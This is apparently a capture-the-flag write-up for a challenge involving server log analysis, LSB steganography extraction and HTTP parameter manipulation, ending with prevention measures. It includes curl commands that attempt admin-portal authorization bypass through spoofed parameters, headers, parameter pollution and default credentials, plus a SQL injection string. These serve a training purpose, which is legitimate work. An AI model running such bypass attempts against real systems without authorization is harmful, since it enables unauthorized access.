# The Suspicious Upload Challenge - CSBC

## Challenge Description
A developer uploaded suspicious files to the server before leaving. Participants must investigate server logs, extract hidden clues using steganography, and manipulate HTTP parameters to access the admin portal and retrieve the flag.

**Flag format:** `HW{flag}`

## Solution Overview

This challenge tests three main skill areas:
1. **Linux command-line tools** for server log analysis
2. **Steganography analysis** for extracting hidden clues
3. **Web parameter manipulation** for admin portal access

## Step-by-Step Solution

### Step 1: Reconnaissance

First, discover the challenge URL and perform initial reconnaissance:

```bash
python3 suspicious_upload_recon.py
```

This script will:
- Try to discover the challenge URL automatically
- Analyze the main page for clues
- Test common endpoints (`/admin`, `/logs`, `/uploads`, etc.)
- Perform quick checks for log files and suspicious files

### Step 2: Server Log Analysis

Use Linux command-line tools to analyze server logs:

```bash
# Download and analyze logs
wget https://challenge-url/access.log
wget https://challenge-url/error.log

# Search for suspicious patterns
grep -i "admin\|backdoor\|shell\|upload.*\.php" access.log
grep -E "HW\{[^}]+\}" *.log

# Extract IP addresses and analyze frequency
awk '{print $1}' access.log | sort | uniq -c | sort -nr

# Extract URLs with parameters
sed -n 's/.*GET \([^ ]*\).*/\1/p' access.log | grep "?"

# Look for POST requests with suspicious data
grep "POST" access.log | grep -E "(admin|user|role|auth)"
```

### Step 3: Steganography Analysis

Analyze suspicious files for hidden data:

```bash
# Download suspicious files
wget https://challenge-url/uploads/image.jpg
wget https://challenge-url/files/data.txt

# Basic analysis
file image.jpg
strings image.jpg | grep -E "(HW\{|admin|secret|key)"

# Hexdump analysis
hexdump -C image.jpg | tail -20  # Check end of file
hexdump -C image.jpg | grep -E "(HW|admin)"

# LSB steganography extraction (manual)
python3 -c "
import sys
with open('image.jpg', 'rb') as f:
    data = f.read()
lsb_bits = [byte & 1 for byte in data[1000:]]  # Skip header
text = ''
for i in range(0, len(lsb_bits)-7, 8):
    byte_val = sum(lsb_bits[i+j] << j for j in range(8))
    if 32 <= byte_val <= 126:
        text += chr(byte_val)
print(text[:200])
"
```

### Step 4: HTTP Parameter Manipulation

Test various parameter manipulation techniques to access admin portal:

```bash
# Test basic parameter bypasses
curl "https://challenge-url/admin?admin=true"
curl "https://challenge-url/admin?role=admin"
curl "https://challenge-url/admin?user=admin&access=true"

# Test with headers
curl -H "X-Admin: true" "https://challenge-url/admin"
curl -H "X-Role: admin" "https://challenge-url/admin"

# Test parameter pollution
curl "https://challenge-url/admin?admin=false&admin=true"
curl "https://challenge-url/admin?admin[]=true"

# Test POST requests
curl -X POST -d "admin=true&role=admin" "https://challenge-url/admin"
curl -X POST -d "user=admin&password=admin" "https://challenge-url/login"
```

### Step 5: Automated Solution

Run the comprehensive automated solver:

```bash
python3 suspicious_upload_advanced.py https://challenge-url
```

This will perform:
- Comprehensive log analysis using Linux tools
- Advanced steganography detection and extraction
- Systematic HTTP parameter manipulation testing
- Admin portal access attempts

## Common Attack Vectors

### 1. Log File Analysis
- **Access logs** may contain admin credentials in GET/POST parameters
- **Error logs** might reveal file paths or configuration details
- **Debug logs** could contain sensitive information or flags

### 2. Steganography Techniques
- **LSB (Least Significant Bit)** hiding in images
- **String extraction** from binary files
- **Base64 encoded** data hidden in files
- **Metadata** in image EXIF data
- **Audio steganography** in WAV/MP3 files

### 3. Parameter Manipulation
- **Parameter pollution**: `admin=false&admin=true`
- **Array parameters**: `admin[]=true`
- **Header injection**: `X-Admin: true`
- **HTTP method override**: Using PUT/PATCH instead of GET/POST
- **SQL injection**: `admin' OR '1'='1`

## Tools Used

### Linux Command-Line Tools
- `grep` - Pattern searching in logs
- `awk` - Field extraction and processing
- `sed` - Stream editing and pattern replacement
- `sort`/`uniq` - Frequency analysis
- `strings` - Extract printable strings from files
- `file` - Determine file types
- `hexdump` - Hexadecimal file analysis

### Steganography Tools
- `strings` - Extract text from binary files
- `hexdump` - Analyze file structure
- `steghide` - Hide/extract data in images (if available)
- `outguess` - JPEG steganography tool (if available)
- Custom LSB extraction scripts

### Web Testing Tools
- `curl` - HTTP request testing
- `requests` (Python) - Automated web testing
- Browser developer tools for manual testing

## Expected Flag Location

The flag `HW{...}` could be found in:
1. **Server logs** - Hidden in log entries or error messages
2. **Steganographic files** - Embedded in images or audio files
3. **Admin portal** - Displayed after successful authentication bypass
4. **Configuration files** - Accessible through directory traversal
5. **Database dumps** - If database access is gained

## Prevention Measures

To prevent this type of attack:
1. **Secure log files** - Restrict access and avoid logging sensitive data
2. **Input validation** - Properly validate all user inputs
3. **Access controls** - Implement proper authentication and authorization
4. **File upload restrictions** - Validate file types and scan for malicious content
5. **Parameter validation** - Prevent parameter pollution and injection attacks

## Conclusion

This challenge demonstrates the importance of:
- Proper log management and security
- Understanding steganography techniques
- Secure web application development
- Defense in depth security strategies

The combination of log analysis, steganography, and web exploitation makes this a comprehensive security challenge that tests multiple skill areas.